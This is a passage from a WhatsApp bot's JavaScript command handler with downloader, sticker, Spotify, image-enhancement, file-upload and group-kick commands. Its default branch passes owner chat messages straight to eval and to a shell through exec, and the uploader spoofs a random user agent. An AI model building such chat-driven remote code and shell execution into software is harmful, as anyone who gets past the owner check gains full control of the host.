*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_
\`⏤͟͟͞͞ Downloader By ${global.namaOwner}\`
`;
 AndraZyy.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
}
break

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("𝑬𝒏 𝒆𝒏𝒗𝒐𝒚𝒂𝒏𝒕/𝒓𝒆́𝒑𝒐𝒏𝒅𝒂𝒏𝒕 𝒂̀ 𝒖𝒏𝒆 𝒑𝒉𝒐𝒕𝒐𝒔/𝒗𝒊𝒅𝒆́𝒐𝒔. 🧞‍♂️🤲🏽"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("𝑳𝒂 𝒅𝒖𝒓𝒆́𝒆 𝒎𝒂𝒙𝒊𝒎𝒂𝒍𝒆 𝒅𝒆 𝒍𝒂 𝒗𝒊𝒅𝒆́𝒐 𝒆𝒔𝒕 𝒅𝒆 15 𝒔𝒆𝒄𝒐𝒏𝒅𝒆𝒔. 🧞‍♂️🤲🏽")
}
reply("𝑽𝒆𝒖𝒊𝒍𝒍𝒆𝒛 𝒑𝒂𝒕𝒊𝒆𝒏𝒕𝒆𝒓 𝒖𝒏𝒆 𝒎𝒊𝒏𝒖𝒕𝒆...")
var media = await AndraZyyt.downloadAndSaveMediaMessage(qmsg)
await AndraZyy.sendStimg(m.chat, media, m, {packname: `𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 ${namaBot} 👑`})
await fs.unlinkSync(media)
}
break

case 'splay': {
 const axios = require("axios");
 if (!text) return m.reply('𝑬𝒏𝒕𝒓𝒆𝒛 𝒍𝒆𝒙𝒆𝒎𝒑𝒍𝒆 𝑻𝒊𝒕𝒓𝒆\n𝑬𝒙𝒆𝒎𝒑𝒍𝒆 `𝑫𝒂𝒅𝒋𝒖 𝑹𝒆𝒊𝒏𝒆. 🧞‍♂️🤲🏽`');

 await reply("𝑽𝒆𝒖𝒊𝒍𝒍𝒆𝒛 𝒑𝒂𝒕𝒊𝒆𝒏𝒕𝒆𝒓 𝒖𝒏𝒆 𝒎𝒊𝒏𝒖𝒕𝒆...");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return reply("𝑪𝒉𝒂𝒏𝒔𝒐𝒏 𝒊𝒏𝒕𝒓𝒐𝒖𝒗𝒂𝒃𝒍𝒆. 🧞‍♂️🤲🏽");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Titre:* ${data.title}
- *Artiste:* ${data.artist}
- *Lien:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await AndraZyy.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"KERM SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await AndraZyy.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 m.reply("𝑰𝒎𝒑𝒐𝒔𝒔𝒊𝒃𝒍𝒆 𝒅,𝒐𝒃𝒕𝒆𝒏𝒊𝒓 𝒍𝒆 𝒇𝒊𝒄𝒉𝒊𝒆𝒓 𝒂𝒖𝒅𝒊𝒐. 🧞‍♂️🤲🏽");
 }
 } catch (error) {
 console.error(error);
 m.reply("𝑼𝒏𝒆 𝒆𝒓𝒓𝒆𝒖𝒓 𝒔,𝒆𝒔𝒕 𝒑𝒓𝒐𝒅𝒖𝒊𝒕𝒆 𝒍𝒐𝒓𝒔 𝒅𝒆 𝒍𝒂 𝒓𝒆́𝒄𝒖𝒑𝒆́𝒓𝒂𝒕𝒊𝒐𝒏 𝒅𝒖 𝒇𝒊𝒄𝒉𝒊𝒆𝒓 𝒂𝒖𝒅𝒊𝒐. 🧞‍♂️🤲🏽");
 }
}
break

case 'hd':
case 'hdr': 
case 'hdimg':
case 'remini':
case 'enhance': {
if (!/image/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
reply("𝑽𝒆𝒖𝒊𝒍𝒍𝒆𝒛 𝒑𝒂𝒕𝒊𝒆𝒏𝒕𝒆𝒓 𝒖𝒏𝒆 𝒎𝒊𝒏𝒖𝒕𝒆...")
let media = await quoted.download()
let proses = await remini(media, "Améliorer");
AndraZyy.sendMessage(m.chat, { image: proses, caption: '𝑨𝒎𝒆́𝒍𝒊𝒐𝒓𝒆𝒓 𝒂𝒗𝒆𝒄 𝒔𝒖𝒄𝒄𝒆̀𝒔 𝒑𝒂𝒓 𝑲𝑬𝑹𝑴 𝑩𝑼𝑮 𝑽6 ✅'}, { quoted: m})
}
break
case 'tourl': case 'url': {
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fakeUserAgent = require("fake-useragent");
const { filesize } = require('filesize');
	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || ''
	const createFormData = (content, fieldName, ext) => {
 const { mime } = fromBuffer(content) || {};
 const formData = new FormData();
 formData.append(fieldName, content, `${new Date()}.${ext}`);
 return formData;
};

const catbox = async (content) => {
 try {
 /*
 @ CatBox Uploader
 $ Create by Syaii
 */
 const { ext, mime } = (await fromBuffer(content)) || {};
 const formData = createFormData(content, "fileToUpload", ext);
 formData.append("reqtype", "fileupload");
 const response = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: formData,
 headers: {
 "User-Agent": fakeUserAgent(),
 },
 });
 return await response.text();
 } catch (error) {
 throw false;
 }
 }
	if (!mime) return reply('𝑹𝒆́𝒑𝒐𝒏𝒅 𝒂̀ 𝒖𝒏 𝒎𝒆𝒅𝒊𝒂. 𝒑𝒉𝒐𝒕𝒐/𝒗𝒊𝒅𝒆𝒐. 🧞‍♂️🤲🏽 !')
	reply("𝑽𝒆𝒖𝒊𝒍𝒍𝒆𝒛 𝒑𝒂𝒕𝒊𝒆𝒏𝒕𝒆𝒓 𝒖𝒏𝒆 𝒎𝒊𝒏𝒖𝒕𝒆...")
	let media = await q.download()
	let link = await catbox(media)
	let size = await fetch(link)
	size = await size.text()
	size = await filesize(size.length)
	let caption = `*SUCCÈS TÉLÉCHARGER UN FICHIER PAR KERM BYG V6*

📊 *T A I L L E :* ${size} Bite
🔗 *L I E N :* ${link} !
`
await AndraZyy.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: qtext2 })
}
break

case "kick": case "kik": {
if (!m.isGroup) return reply("𝑮𝒓𝒐𝒖𝒑𝒆 𝒖𝒏𝒊𝒒𝒖𝒆𝒎𝒆𝒏𝒕. 🧞‍♂️🤲🏽")
if (!isCreator && !m.isAdmins) return reply("𝑷𝒓𝒐𝒑𝒓𝒊𝒆́𝒕𝒂𝒊𝒓𝒆 𝒖𝒏𝒊𝒒𝒖𝒆𝒎𝒆𝒏𝒕. 🧞‍♂️🤲🏽")
if (!m.isBotAdmins) return Reply("𝑳𝒆 𝒃𝒐𝒕 𝒅𝒐𝒊𝒕 𝒆̂𝒕𝒓𝒆 𝒂𝒅𝒎𝒊𝒏. 🧞‍♂️🤲🏽")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await AndraZyy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("𝑳𝒆 𝒏𝒖𝒎𝒆́𝒓𝒐 𝒏,𝒆𝒔𝒕 𝒑𝒂𝒔 𝒆𝒏𝒓𝒆𝒈𝒊𝒔𝒕𝒓𝒆́ 𝒔𝒖𝒓 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑. 🧞‍♂️🤲🏽")
const res = await AndraZyy.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/répond"))
}
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == AndraZyy) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})